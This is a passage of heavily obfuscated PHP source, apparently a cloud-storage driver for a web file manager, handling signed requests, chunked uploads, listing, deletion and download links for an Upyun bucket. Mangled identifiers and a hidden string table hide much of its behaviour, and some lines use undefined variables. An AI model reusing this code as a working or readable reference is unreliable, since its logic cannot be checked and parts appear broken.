$this->findByName($±ï’æµ—[$¥Ë¦Ø¤–[32]]); if (!$¬Í¦íñÉ || $™ûŞ¡«É && $™ûŞ¡«É[$¥Ë¦Ø¤–[451]] != $¬Í¦íñÉ[$¥Ë¦Ø¤–[451]]) { return !1; } return parent::update($¬Í¦íñÉ[$¥Ë¦Ø¤–[451]], $±ï’æµ—); } } goto bÄøËó—®ˆ; Cé†¦Ÿ“‹Š: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\x70\x3a\x2f\57\x76\x30\x2e\x61\x70\x69\56\x75\x70\171\x75\156\56\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($›ùãÄææ) { parent::__construct(); $this->_init($›ùãÄææ); } public function _init($³Ëœ–õ) { $Öæ€«ìÀ =& $_SERVER[Ö†ØøÖ±]; foreach ($³Ëœ–õ as $Ÿ™å¬‹¦ => $×ïƒŸô¼) { if (isset($this->{$Ÿ™å¬‹¦})) { $this->{$Ÿ™å¬‹¦} = $×ïƒŸô¼; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Öæ€«ìÀ[1491] . LNG($Öæ€«ìÀ[1422])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ë—é¶²², $‚½ÆË´­ = "\x47\x45\124") { $ñíäË°× =& $_SERVER[Ö†ØøÖ±]; $ä†°éš¶ = gmdate($ñíäË°×[1455]); $Ú—Ùèóì = base64_encode(hash_hmac($ñíäË°×[1492], "{$‚½ÆË´­}\46{$ë—é¶²²}\x26{$ä†°éš¶}", md5("{$this->userpass}"), !0)); $§‰Ì£à¶ = array("\101\x75\164\150\x6f\162\x69\x7a\141\164\151\x6f\156\72\x55\x50\131\x55\x4e\40{$this->username}\x3a{$Ú—Ùèóì}", "\x44\141\164\x65\72{$ä†°éš¶}"); return $§‰Ì£à¶; } public function ussRequest($Ğ›Å¦ÏÑ, $õÔœ³Ü = "\x47\105\x54", $Ç¸ š¾ = false, $•…® Ãâ = false, $•”üõèõ = false) { $€…ÕÀ =& $_SERVER[Ö†ØøÖ±]; $Ğ›Å¦ÏÑ = trim($Ğ›Å¦ÏÑ, $€…ÕÀ[8]); $‹‹İ”äœ = "\57{$this->bucket}\57{$Ğ›Å¦ÏÑ}"; $¸Â•§û¸ = $this->ussHeaders($‹‹İ”äœ, $õÔœ³Ü); if ($•…® Ãâ) { $¸Â•§û¸ = array_merge($¸Â•§û¸, $•…® Ãâ); } $Ü”Àçí = url_request($this->endpoint . $‹‹İ”äœ, $õÔœ³Ü, $Ç¸ š¾, $¸Â•§û¸, $•”üõèõ); if (!$Ü”Àçí) { return array($€…ÕÀ[1265] => !1, $€…ÕÀ[1255] => $€…ÕÀ[1493]); } if (strtolower($õÔœ³Ü) == $€…ÕÀ[211] || in_array($Ü”Àçí[$€…ÕÀ[1265]], array($€…ÕÀ[257], $€…ÕÀ[1494]))) { $Ç¸ š¾ = $Ü”Àçí[$€…ÕÀ[1495]]; } else { $Ç¸ š¾ = json_decode($Ü”Àçí[$€…ÕÀ[1255]], !0); if (!$Ç¸ š¾) { $Ç¸ š¾ = $Ü”Àçí[$€…ÕÀ[1255]]; } else { if (!$Ü”Àçí[$€…ÕÀ[803]] && isset($Ç¸ š¾[$€…ÕÀ[1496]])) { $Ç¸ š¾ = $Ç¸ š¾[$€…ÕÀ[1496]]; } } } return array($€…ÕÀ[1265] => $Ü”Àçí[$€…ÕÀ[803]], $€…ÕÀ[1255] => $Ç¸ š¾); } public function mkfile($©ÁïúĞé, $Š¯ìûü = '', $îÅ”Íã = REPEAT_RENAME) { if ($this->setContent($©ÁïúĞé, $Š¯ìûü)) { return $this->getPathOuter($©ÁïúĞé); } return !1; } public function mkdir($²–“õ…¨, $è÷¡Äò† = REPEAT_SKIP) { $ÚòÚŸãÎ =& $_SERVER[Ö†ØøÖ±]; $ï½şº×ˆ = trim($²–“õ…¨, $ÚòÚŸãÎ[8]); if ($this->_isFolder($ï½şº×ˆ)) { return $this->getPathOuter($ï½şº×ˆ); } $¦Òß±¿Å = array($ÚòÚŸãÎ[1497]); $ïÄÆåÂ† = $this->ussRequest($ï½şº×ˆ, $ÚòÚŸãÎ[241], !1, $¦Òß±¿Å); return $ïÄÆåÂ†[$ÚòÚŸãÎ[1265]] ? $this->getPathOuter($ï½şº×ˆ) : !1; } public function copyFile($õó¤âì¾, $¬÷ÃŸ÷’) { $ƒÉùñ§ =& $_SERVER[Ö†ØøÖ±]; $½¶ş‘²¤ = array($ƒÉùñ§[1498] . "\x2f{$this->bucket}\57{$õó¤âì¾}", $ƒÉùñ§[1499]); $‹ş³îæ = $this->ussRequest($¬÷ÃŸ÷’, $ƒÉùñ§[243], !1, $½¶ş‘²¤); return $‹ş³îæ[$ƒÉùñ§[1265]] ? !0 : $this->getPathOuter($¬÷ÃŸ÷’); } public function moveFile($ôû”Ú•™, $ŒáÇô·) { $ÛÆ›ƒÜ— =& $_SERVER[Ö†ØøÖ±]; $ÁË¥ˆè = array($ÛÆ›ƒÜ—[1500] . "\57{$this->bucket}\57{$ôû”Ú•™}", $ÛÆ›ƒÜ—[1499]); $Êıã½¬ = $this->ussRequest($ŒáÇô·, $ÛÆ›ƒÜ—[243], !1, $ÁË¥ˆè); return $Êıã½¬[$ÛÆ›ƒÜ—[1265]] ? !0 : $this->getPathOuter($ŒáÇô·); } public function delFile($’šŞ¶È†) { $¨‘™Î·Ì =& $_SERVER[Ö†ØøÖ±]; $—¥üµ¬ù = $this->ussRequest($’šŞ¶È†, $¨‘™Î·Ì[1501]); return $—¥üµ¬ù[$¨‘™Î·Ì[1265]] ? !0 : !1; } public function delFolder($—š•ˆçÏ) { $ÀøŒã =& $_SERVER[Ö†ØøÖ±]; if (!$this->exist($—š•ˆçÏ)) { return !0; } $this->listItemCache = !1; $¯ññ˜ìš = $Ö¬Ü½¶­ = array(); $this->fileList($—š•ˆçÏ, $¯ññ˜ìš, $Ö¬Ü½¶­, !0); $this->listItemCache = !0; foreach ($Ö¬Ü½¶­ as $™àÌî¹Ğ) { $†è…Å¾ñ = $this->ussRequest($™àÌî¹Ğ[$ÀøŒã[32]], $ÀøŒã[1501]); if (!$†è…Å¾ñ[$ÀøŒã[1265]]) { return !1; } } foreach ($¯ññ˜ìš as $ÌĞ”®ù) { $†è…Å¾ñ = $this->ussRequest($ÌĞ”®ù, $ÀøŒã[1501]); if (!$†è…Å¾ñ[$ÀøŒã[1265]]) { return !1; } } $†è…Å¾ñ = $this->ussRequest($—š•ˆçÏ, $ÀøŒã[1501]); return $†è…Å¾ñ[$ÀøŒã[1265]]; } public function rename($ôı×ıÎœ, $¥Œ¾ƒ¤î) { if ($this->isFile($ôı×ıÎœ)) { $¥Œ¾ƒ¤î = get_path_father($ôı×ıÎœ) . $¥Œ¾ƒ¤î; return $this->moveFile($ôı×ıÎœ, $¥Œ¾ƒ¤î); } return $this->renameObject($ôı×ıÎœ, $¥Œ¾ƒ¤î); } public function fileInfo($óù½Ê’Ë, $Øè›…Ã = false, $Ñ‚Ê”« = array()) { $ùşıëÃ =& $_SERVER[Ö†ØøÖ±]; $¾‚×¿§Ô = array($ùşıëÃ[32] => $this->pathThis($óù½Ê’Ë), $ùşıëÃ[84] => $this->getPathOuter($ùşıëÃ[8] . $óù½Ê’Ë), $ùşıëÃ[33] => $ùşıëÃ[214], $ùşıëÃ[76] => isset($Ñ‚Ê”«[$ùşıëÃ[76]]) ? $Ñ‚Ê”«[$ùşıëÃ[76]] : 0, $ùşıëÃ[175] => $this->ext($óù½Ê’Ë)); if ($Øè›…Ã) { return $¾‚×¿§Ô; } $¾‚×¿§Ô[$ùşıëÃ[215]] = $¾‚×¿§Ô[$ùşıëÃ[85]] = 0; $¾‚×¿§Ô[$ùşıëÃ[216]] = $¾‚×¿§Ô[$ùşıëÃ[217]] = !0; if (empty($Ñ‚Ê”«)) { $Ñ‚Ê”« = $this->objectMeta($óù½Ê’Ë); if (!$Ñ‚Ê”«) { return $¾‚×¿§Ô; } } $¾‚×¿§Ô[$ùşıëÃ[215]] = intval($Ñ‚Ê”«[$ùşıëÃ[1502]]); $¾‚×¿§Ô[$ùşıëÃ[85]] = intval($Ñ‚Ê”«[$ùşıëÃ[1503]]); $¾‚×¿§Ô[$ùşıëÃ[76]] = $Ñ‚Ê”«[$ùşıëÃ[76]]; return $¾‚×¿§Ô; } public function folderInfo($ğ±ŸùÌ§, $ò—¦ìÓï = false) { $­œ¬£‡å =& $_SERVER[Ö†ØøÖ±]; $•¹ó»³Ó = array($­œ¬£‡å[32] => $this->pathThis($ğ±ŸùÌ§), $­œ¬£‡å[84] => $this->getPathOuter($­œ¬£‡å[8] . $ğ±ŸùÌ§), $­œ¬£‡å[33] => $­œ¬£‡å[75]); if ($ò—¦ìÓï) { return $•¹ó»³Ó; } $•¹ó»³Ó[$­œ¬£‡å[215]] = $•¹ó»³Ó[$­œ¬£‡å[85]] = 0; $•¹ó»³Ó[$­œ¬£‡å[216]] = $•¹ó»³Ó[$­œ¬£‡å[217]] = !0; if (empty($£–ûŸ‰˜)) { $£–ûŸ‰˜ = $this->objectMeta($ğ±ŸùÌ§); if (!$£–ûŸ‰˜) { return $•¹ó»³Ó; } } $•¹ó»³Ó[$­œ¬£‡å[215]] = intval($£–ûŸ‰˜[$­œ¬£‡å[1502]]); $•¹ó»³Ó[$­œ¬£‡å[85]] = intval($£–ûŸ‰˜[$­œ¬£‡å[1503]]); return $•¹ó»³Ó; } private function listObjs($Á¤²å¨´, $¯æÑËµ¶ = 0, $ô¶¥¬ = 1000) { $Ì°‘Ÿº =& $_SERVER[Ö†ØøÖ±]; $¤à¯åÎ = array($Ì°‘Ÿº[1504], $Ì°‘Ÿº[1505] . $ô¶¥¬); if ($¯æÑËµ¶) { $¤à¯åÎ[] = $Ì°‘Ÿº[1506] . $¯æÑËµ¶; } $ãº…½õÊ = $this->ussRequest($Á¤²å¨´, $Ì°‘Ÿº[245], !1, $¤à¯åÎ); return !$ãº…½õÊ[$Ì°‘Ÿº[1265]] ? !1 : $ãº…½õÊ[$Ì°‘Ÿº[1255]]; } private function fileList($¢˜·Ş¶, &$Ò¦™¬üÁ, &$²Ìå¾ÆÍ, $‡¡Ãô“Õ = false) { $º«ÔÒÃˆ =& $_SERVER[Ö†ØøÖ±]; $¡ø °ÒŒ = $º«ÔÒÃˆ[12]; $ğÙí¹Ş± = 1000; $½®­„‡İ = rtrim($¢˜·Ş¶, $º«ÔÒÃˆ[8]) . $º«ÔÒÃˆ[8]; while (!0) { check_abort(); $ùÈğ¿É½ = $this->listObjs($¢˜·Ş¶, $¡ø °ÒŒ, $ğÙí¹Ş±); if (!$ùÈğ¿É½) { return !1; } $¡ø °ÒŒ = isset($ùÈğ¿É½[$º«ÔÒÃˆ[1507]]) ? $ùÈğ¿É½[$º«ÔÒÃˆ[1507]] : $º«ÔÒÃˆ[12]; $€äæÂÅ = isset($ùÈğ¿É½[$º«ÔÒÃˆ[1508]]) ? $ùÈğ¿É½[$º«ÔÒÃˆ[1508]] : array(); foreach ($€äæÂÅ as $üéœŠÈß) { $º§øØİİ = $üéœŠÈß[$º«ÔÒÃˆ[33]] == $º«ÔÒÃˆ[75] ? !0 : !1; $ãàÛ¢£ = ltrim($½®­„‡İ . $üéœŠÈß[$º«ÔÒÃˆ[32]], $º«ÔÒÃˆ[8]) . ($º§øØİİ ? $º«ÔÒÃˆ[8] : $º«ÔÒÃˆ[12]); $’°Û¯à  = array($º«ÔÒÃˆ[32] => $ãàÛ¢£, $º«ÔÒÃˆ[33] => $º§øØİİ ? $º«ÔÒÃˆ[75] : $º«ÔÒÃˆ[214], $º«ÔÒÃˆ[76] => $üéœŠÈß[$º«ÔÒÃˆ[390]], $º«ÔÒÃˆ[1503] => $üéœŠÈß[$º«ÔÒÃˆ[1509]]); $this->cacheMethodInfoSet($ãàÛ¢£, $º§øØİİ, $’°Û¯à ); if ($º§øØİİ) { $Ò¦™¬üÁ[] = $ãàÛ¢£; if ($‡¡Ãô“Õ) { $this->fileList($ãàÛ¢£, $Ò¦™¬üÁ, $²Ìå¾ÆÍ, $‡¡Ãô“Õ); } continue; } $²Ìå¾ÆÍ[] = $’°Û¯à ; } if (count($€äæÂÅ) < $ğÙí¹Ş±) { break; } } $this->cacheMethodInfoSet($¢˜·Ş¶, !0); } public function listPath($ÄúÓáˆŞ, $ÔÏ‰õ–Î = false) { $ƒ‘ß¢¬ =& $_SERVER[Ö†ØøÖ±]; $ÓïÈÁæ­ = $ÏÄë¡Ã = array(); $this->fileList($ÄúÓáˆŞ, $ÓïÈÁæ­, $ÏÄë¡Ã); foreach ($ÓïÈÁæ­ as $ÒÍÌàİÊ => $Æ¼Á»ı²) { $ÓïÈÁæ­[$ÒÍÌàİÊ] = $this->folderInfo($Æ¼Á»ı², $ÔÏ‰õ–Î); } foreach ($ÏÄë¡Ã as $ÒÍÌàİÊ => $Æ¼Á»ı²) { $ÏÄë¡Ã[$ÒÍÌàİÊ] = $this->fileInfo($Æ¼Á»ı²[$ƒ‘ß¢¬[32]], $ÔÏ‰õ–Î, $Æ¼Á»ı²); } return array($ƒ‘ß¢¬[82] => $ÓïÈÁæ­, $ƒ‘ß¢¬[83] => $ÏÄë¡Ã); } public function has($Ñ·¯õ, $ŸË‡ ş¯ = false, $íĞ÷š¢ = true) { $íîŠµ…ú =& $_SERVER[Ö†ØøÖ±]; $š¶Š¯µ– = $íîŠµ…ú[12]; $¹®÷çÍı = 500; $˜ŸÎÁ³ = 0; $èóí˜ = 0; $¥ª¶‚áş = rtrim($Ñ·¯õ, $íîŠµ…ú[8]) . $íîŠµ…ú[8]; while (!0) { check_abort(); $ØÀ²¾½Ù = $this->listObjs($Ñ·¯õ, $š¶Š¯µ–, $¹®÷çÍı); if (!$ØÀ²¾½Ù) { return !1; } $š¶Š¯µ– = isset($ØÀ²¾½Ù[$íîŠµ…ú[1507]]) ? $ØÀ²¾½Ù[$íîŠµ…ú[1507]] : $íîŠµ…ú[12]; $¿ÛÇëÚª = isset($ØÀ²¾½Ù[$íîŠµ…ú[1508]]) ? $ØÀ²¾½Ù[$íîŠµ…ú[1508]] : array(); if (empty($¿ÛÇëÚª)) { break; } $ûË´€Ü = array_filter($¿ÛÇëÚª, function ($Ë•®ó€÷) { $¾Ü¾Å­Ñ =& $_SERVER[Ö†ØøÖ±]; return $Ë•®ó€÷[$¾Ü¾Å­Ñ[33]] == $¾Ü¾Å­Ñ[75]; }); $Í ¸¬èŸ = count($¿ÛÇëÚª); $ûË´€Ü = count($ûË´€Ü); $±ˆõ¨”Î = $Í ¸¬èŸ - $ûË´€Ü; if ($ŸË‡ ş¯) { $èóí˜ += $ûË´€Ü; $˜ŸÎÁ³ += $±ˆõ¨”Î; if ($Í ¸¬èŸ < $¹®÷çÍı) { break; } continue; } if ($íĞ÷š¢) { if ($±ˆõ¨”Î) { return !0; } } else { if ($ûË´€Ü) { return !0; } } if ($Í ¸¬èŸ < $¹®÷çÍı) { break; } } if ($ŸË‡ ş¯) { return array($íîŠµ…ú[223] => $˜ŸÎÁ³, $íîŠµ…ú[224] => $èóí˜); } return !1; } public function listAll($µá·íÂÅ) { $Œ¦¶åñ =& $_SERVER[Ö†ØøÖ±]; $¹º‡µ¡ş = $ó•¥²‹‡ = array(); $this->fileList($µá·íÂÅ, $¹º‡µ¡ş, $ó•¥²‹‡, !0); $êëÈÀÀñ = array_to_keyvalue($ó•¥²‹‡, $Œ¦¶åñ[32]); foreach ($¹º‡µ¡ş as $ûúôÂË†) { if (is_string($ûúôÂË†)) { $êëÈÀÀñ[$ûúôÂË†] = array($Œ¦¶åñ[76] => 0); } } return $this->listAllFiles($µá·íÂÅ, $êëÈÀÀñ); } public function canRead($ù‘Í°§¤) { return $this->exist($ù‘Í°§¤) ? !0 : !1; } public function canWrite($±­º«‹) { return $this->exist($±­º«‹) ? !0 : !1; } public function getContent($ş²€’») { return $this->fileSubstr($ş²€’», 0, -1); } public function setContent($óÒöİË, $£ø»şù„ = '') { $ÍØ›—ğ =& $_SERVER[Ö†ØøÖ±]; if (!$£ø»şù„) { $È¾àà˜Û = $this->ussRequest($óÒöİË, $ÍØ›—ğ[241]); return $È¾àà˜Û[$ÍØ›—ğ[1265]]; } $ÃÒ™±”Æ = $this->tempFile($this->pathThis($óÒöİË)); file_put_contents($ÃÒ™±”Æ, $£ø»şù„); if ($this->upload($óÒöİË, $ÃÒ™±”Æ)) { $this->tempFileRemve($ÃÒ™±”Æ); return !0; } return !1; } public function fileSubstr($ŒõêÀïğ, $İ–´‡¦, $„º¥²¬ñ) { $†Á–æêî =& $_SERVER[Ö†ØøÖ±]; if (!($šùñ²¢­ = $this->link($ŒõêÀïğ))) { return !1; } $Ìı”—ÂÛ = !1; if ($„º¥²¬ñ > 0) { $ıøÑ»³ = $İ–´‡¦ + $„º¥²¬ñ - 1; $Ìı”—ÂÛ = array($†Á–æêî[1470] . $İ–´‡¦ . $†Á–æêî[438] . $ıøÑ»³); } $ûı½ëÊÉ = url_request($šùñ²¢­, $†Á–æêî[245], !1, $Ìı”—ÂÛ); return $ûı½ëÊÉ[$†Á–æêî[803]] ? $ûı½ëÊÉ[$†Á–æêî[1255]] : !1; } public function upload($ù †À§¬, $å¢€ À, $œ²ÜĞËø = false, $îÎŸ¥„ = REPEAT_REPLACE) { $îİ÷‘›ú =& $_SERVER[Ö†ØøÖ±]; $ÍÉÍÕ¢ª = IO::size($å¢€ À); if ($ÍÉÍÕ¢ª <= 1024 * 1024 * 200) { $¶€™Ñôı = array($îİ÷‘›ú[1510] . $å¢€ À); $©–™òÊË = $this->ussRequest($ù †À§¬, $îİ÷‘›ú[243], $¶€™Ñôı); return $©–™òÊË[$îİ÷‘›ú[1265]] ? $this->getPathOuter($ù †À§¬) : !1; } $øÔîá¡Õ = 1024 * 1024 * 10; $ÕõĞÍäò = array($îİ÷‘›ú[1511], $îİ÷‘›ú[1512] . $ÍÉÍÕ¢ª, $îİ÷‘›ú[1513], $îİ÷‘›ú[1514] . $øÔîá¡Õ); $©–™òÊË = $this->ussRequest($ù †À§¬, $îİ÷‘›ú[243], !1, $ÕõĞÍäò); if (!$©–™òÊË[$îİ÷‘›ú[1265]]) { return !1; } $„’ÀŞ©ƒ = $©–™òÊË[$îİ÷‘›ú[1255]]; $èèäÕß‡ = 0; $Ì‹áÈ”Œ = $„’ÀŞ©ƒ[$îİ÷‘›ú[1515]]; $œŠá´·ê = fopen($å¢€ À, $îİ÷‘›ú[1419]); if (!$œŠá´·ê) { return !1; } do { $™”õµ‡ = $„’ÀŞ©ƒ[$îİ÷‘›ú[1516]]; fseek_64($œŠá´·ê, $èèäÕß‡); $œ±ÕëÛ = fread($œŠá´·ê, $™”õµ‡); $şÍï„ § = 0; do { $şÍï„ §++; $„’ÀŞ©ƒ = $this->uploadPart($ù †À§¬, $„’ÀŞ©ƒ, $œ±ÕëÛ); } while (!$„’ÀŞ©ƒ && $şÍï„ § < 3); if (!$„’ÀŞ©ƒ) { return !1; } $Ì‹áÈ”Œ = $„’ÀŞ©ƒ[$îİ÷‘›ú[1515]]; $èèäÕß‡ += $™”õµ‡; } while ($Ì‹áÈ”Œ != -1); fclose($œŠá´·ê); $ÕõĞÍäò = array($îİ÷‘›ú[1517], $îİ÷‘›ú[1518] . $„’ÀŞ©ƒ[$îİ÷‘›ú[1519]], $îİ÷‘›ú[1513]); $©–™òÊË = $this->ussRequest($ù †À§¬, $îİ÷‘›ú[243], !1, $ÕõĞÍäò); return $©–™òÊË[$îİ÷‘›ú[1265]] ? $this->getPathOuter($”ÓµÊÓÓ) : !1; } private function uploadPart($‰ñ¿˜¥½, $•ÂÅğ¯™, &$Î½ÌéÁô) { $ÖÉÃ– =& $_SERVER[Ö†ØøÖ±]; $®Â÷ã’Ã = array($ÖÉÃ–[1520], $ÖÉÃ–[1518] . $•ÂÅğ¯™[$ÖÉÃ–[1519]], $ÖÉÃ–[1521] . $•ÂÅğ¯™[$ÖÉÃ–[1515]], $ÖÉÃ–[143] . $•ÂÅğ¯™[$ÖÉÃ–[1516]]); $Æç’€á = $this->ussRequest($‰ñ¿˜¥½, $ÖÉÃ–[243], $Î½ÌéÁô, $®Â÷ã’Ã); return !$Æç’€á[$ÖÉÃ–[1265]] ? $Æç’€á[$ÖÉÃ–[1265]] : $Æç’€á[$ÖÉÃ–[1255]]; } public function uploadFormData($‹¦êöãß, $®ŞÔæª³ = 3600) { return $this->uploadPolicy($‹¦êöãß, $®ŞÔæª³); } public function multiUploadFormData($…¸ÃÅÁ£, $ÆÂï¦“ = 3600) { $ÖŸûš¾É =& $_SERVER[Ö†ØøÖ±]; $Šğß–‰¬ = (int) $GLOBALS[$ÖŸûš¾É[7]][$ÖŸûš¾É[76]]; return $this->uploadPolicy($…¸ÃÅÁ£, $ÆÂï¦“, $Šğß–‰¬); } private function uploadPolicy($ûõ‘şúÄ, $«Â–ƒÖã = 3600, $”¨½èÂú = 0) { $øãÊæŒ› =& $_SERVER[Ö†ØøÖ±]; $Ú’ÅÒèÄ = $øãÊæŒ›[8] . $this->bucket; $÷úô”™ = gmdate($øãÊæŒ›[1455]); $€àşòî‹ = array($øãÊæŒ›[1522] => $this->bucket, $øãÊæŒ›[1523] => $ûõ‘şúÄ, $øãÊæŒ›[1524] => time() + $«Â–ƒÖã, $øãÊæŒ›[1525] => $÷úô”™); if ($”¨½èÂú) { $€àşòî‹[$øãÊæŒ›[1436]] = $”¨½èÂú; } $Èµó÷ÏÎ = base64_encode(json_encode($€àşòî‹)); $ß‰¢ï¥ = base64_encode(hash_hmac($øãÊæŒ›[1492], "\x50\117\x53\124\x26{$Ú’ÅÒèÄ}\46{$÷úô”™}\46{$Èµó÷ÏÎ}", md5("{$this->userpass}"), !0)); $İÈÍóÄí = array($øãÊæŒ›[276] => $Èµó÷ÏÎ, $øãÊæŒ›[1526] => "\x55\120\x59\x55\116\x20{$this->username}\72{$ß‰¢ï¥}", $øãÊæŒ›[196] => $this->endpoint . $Ú’ÅÒèÄ); return $İÈÍóÄí; } public function download($û¼Ôëçù, $ú¾ü–œî) { $‘¹©‘à› = IO::getPathInner(IO::mkfile($ú¾ü–œî)); if (!($ûÑ»€±² = $this->link($û¼Ôëçù))) { return !1; } $â‰…ß¢ï = 0; $»ºì¥×® = 1024 * 200; $µ­å—‘ = fopen($‘¹©‘à›, $_SERVER[Ö†ØøÖ±][1476]); while (!0) { $÷òš¶’Ú = $this->fileSubstr($û¼Ôëçù, $â‰…ß¢ï, $»ºì¥×®); if ($÷òš¶’Ú === !1) { return !1; } fwrite($µ­å—‘, $÷òš¶’Ú); $â‰…ß¢ï += $»ºì¥×®; if (strlen($÷òš¶’Ú) < $»ºì¥×®) { break; } } fclose($µ­å—‘); return $ú¾ü–œî; } public function link($ÆÖßœãİ, $÷Ö–£½° = array()) { $’·Íâ–É =& $_SERVER[Ö†ØøÖ±]; $ÆÖßœãİ = trim($ÆÖßœãİ, $’·Íâ–É[8]); if (!empty($this->token)) { $¶ÑéÃÓÔ = strtotime(date($’·Íâ–É[1527])); $ÒÊüœäı = substr(md5($this->token . $’·Íâ–É[337] . $¶ÑéÃÓÔ . $’·Íâ–É[1528] . $ÆÖßœãİ), 12, 8) . $¶ÑéÃÓÔ; $÷Ö–£½°[] = $’·Íâ–É[1529] . $ÒÊüœäı; } $¸¢Õ§À = !empty($÷Ö–£½°) ? $’·Íâ–É[73] . implode($’·Íâ–É[337], $÷Ö–£½°) : $’·Íâ–É[12]; return $this->getHost() . $’·Íâ–É[8] . $ÆÖßœãİ . $¸¢Õ§À; } public function fileOut($şÀôë, $à§ìú€ = false, $¾Ìá‡Ç = false, $æî‰îÇ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($şÀôë, $à§ìú€, $¾Ìá‡Ç, $æî‰îÇ); } if (!$¾Ìá‡Ç) { $¾Ìá‡Ç = $this->pathThis($şÀôë); } $ƒ†É“ÉÎ = $à§ìú€ ? array($_SERVER[Ö†ØøÖ±][1530] . rawurlencode($¾Ìá‡Ç)) : array(); $øÄ£Óö° = $this->link($şÀôë, $ƒ†É“ÉÎ); $this->fileOutLink($øÄ£Óö°); } public function fileOutServer($ŠÆø…Üä, $¾Á‹Ä©· = false, $€–·ûì€ = false, $âÃ®¢„¾ = '') { parent::fileOut($ŠÆø…Üä, $¾Á‹Ä©·, $€–·ûì€, $âÃ®¢„¾); } public function fileOutImage($Ê¢»ìØß, $ñ˜Ñ×Ò‰ = 250) { $¥Ç·îâ” = $this->link($Ê¢»ìØß . $_SERVER[Ö†ØøÖ±][1531] . $ñ˜Ñ×Ò‰); $this->fileOutLink($¥Ç·îâ”); } public function fileOutImageServer($úúŞ‡Ì, $ğ˜èÈ¶¥ = 250) { parent::fileOutImage($úúŞ‡Ì, $ğ˜èÈ¶¥); } public function hashMd5($»ş¹ÍŞ¤) { $«õññëò =& $_SERVER[Ö†ØøÖ±]; $îõ¢û‰ó = $this->_objectMeta($»ş¹ÍŞ¤); return isset($îõ¢û‰ó[$«õññëò[228]]) ? $îõ¢û‰ó[$«õññëò[228]] : !1; } public function size($ï½§¤÷Ñ) { $Ø«İÃäâ = $this->objectMeta($ï½§¤÷Ñ); return $Ø«İÃäâ ? $Ø«İÃäâ[$_SERVER[Ö†ØøÖ±][76]] : 0; } public function info($Ûı¬¤Ş¸) { if ($this->isFolder($Ûı¬¤Ş¸)) { return $this->folderInfo($Ûı¬¤Ş¸); } else { if ($this->isFile($Ûı¬¤Ş¸)) { return $this->fileInfo($Ûı¬¤Ş¸); } } return !1; } public function exist($µÁúò·Ù) { return $this->isFile($µÁúò·Ù) || $this->isFolder($µÁúò·Ù); } public function isFile($ú×£å×) { return !$this->isFolder($ú×£å×) && $this->objectMeta($ú×£å×); } public function isFolder($ÃõÂöò) { return $this->cacheMethod($_SERVER[Ö†ØøÖ±][166], $ÃõÂöò); } protected function objectMeta($¬ëªÒÇ ) { return $this->cacheMethod($_SERVER[Ö†ØøÖ±][168], $¬ëªÒÇ ); } protected function _objectMeta($şæùë²ù) { $Ö‚Ùµ® =& $_SERVER[Ö†ØøÖ±]; if ($şæùë²ù == $Ö‚Ùµ®[12] || $şæùë²ù == $Ö‚Ùµ®[8]) { return array(); } $ßÄ‹Ğ§ = $this->ussRequest($şæùë²ù, $Ö‚Ùµ®[1532]); if (!$ßÄ‹Ğ§[$Ö‚Ùµ®[1265]]) { return null; } $õ‚™ÛË¨ = isset($ßÄ‹Ğ§[$Ö‚Ùµ®[1255]]) ? $ßÄ‹Ğ§[$Ö‚Ùµ®[1255]] : array(); if (!isset($õ‚™ÛË¨[$Ö‚Ùµ®[1533]])) { return null; } $·§ˆ£ÒÓ = array($Ö‚Ùµ®[33] => isset($õ‚™ÛË¨[$Ö‚Ùµ®[1533]]) ? $õ‚™ÛË¨[$Ö‚Ùµ®[1533]] : null, $Ö‚Ùµ®[76] => isset($õ‚™ÛË¨[$Ö‚Ùµ®[1534]]) ? $õ‚™ÛË¨[$Ö‚Ùµ®[1534]] : null, $Ö‚Ùµ®[228] => isset($õ‚™ÛË¨[$Ö‚Ùµ®[1535]]) ? $õ‚™ÛË¨[$Ö‚Ùµ®[1535]] : null, $Ö‚Ùµ®[1502] => isset($õ‚™ÛË¨[$Ö‚Ùµ®[1536]]) ? $õ‚™ÛË¨[$Ö‚Ùµ®[1536]] : null); $·§ˆ£ÒÓ[$Ö‚Ùµ®[1503]] = isset($õ‚™ÛË¨[$Ö‚Ùµ®[1537]]) ? strtotime($õ‚™ÛË¨[$Ö‚Ùµ®[1537]]) : $·§ˆ£ÒÓ[$Ö‚Ùµ®[1502]]; return $·§ˆ£ÒÓ; } protected function _isFolder($”£ªÃ¬‡) { $ÁÁÒ‘Õ… =& $_SERVER[Ö†ØøÖ±]; if ($”£ªÃ¬‡ == $ÁÁÒ‘Õ…[12] || $”£ªÃ¬‡ == $ÁÁÒ‘Õ…[8]) { return !0; } $É»Ú‚´ì = $this->_objectMeta($”£ªÃ¬‡); return isset($É»Ú‚´ì[$ÁÁÒ‘Õ…[33]]) && $É»Ú‚´ì[$ÁÁÒ‘Õ…[33]] == $ÁÁÒ‘Õ…[75] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($­ŠÄ†¢à = false) { } public function exist($·îÄĞ¨¼) { $†üÄ·Ù = $this->info($·îÄĞ¨¼); return $†üÄ·Ù[$_SERVER[Ö†ØøÖ±][216]]; } public function isFile($¡ö´ª¬¾) { $¶¿ßÄ«ß = $this->info($¡ö´ª¬¾); return $¶¿ßÄ«ß[$_SERVER[Ö†ØøÖ±][216]]; } public function isFolder($ÒŠè†„) { return !1; } public function size($Ôï¾ç¼Ö) { $”ìéİÖä = $this->info($Ôï¾ç¼Ö); return $”ìéİÖä[$_SERVER[Ö†ØøÖ±][76]]; } public function info($æó¨Òúæ) { return $this->infoParse($æó¨Òúæ); } public function infoAuth($é÷ÍÎİ) { return $this->infoParse($é÷ÍÎİ); } public function infoWithChildren($ ¡ŸÎ ) { return $this->infoParse($ ¡ŸÎ ); } public function infoFull($³İË´™Œ) { return $this->infoParse($³İË´™Œ); } private function infoParse($æ”ÍÃñÌ) { $±›Î¥Î» =& $_SERVER[Ö†ØøÖ±]; $­ıÑŒ… = $this->header($æ”ÍÃñÌ); if (!$­ıÑŒ… || !$­ıÑŒ…[$±›Î¥Î»[803]]) { return !1; } $ÊèÑ×İ§ = _get($­ıÑŒ…, $±›Î¥Î»[390], 0); $²û¯Ü’û = array($±›Î¥Î»[32] => 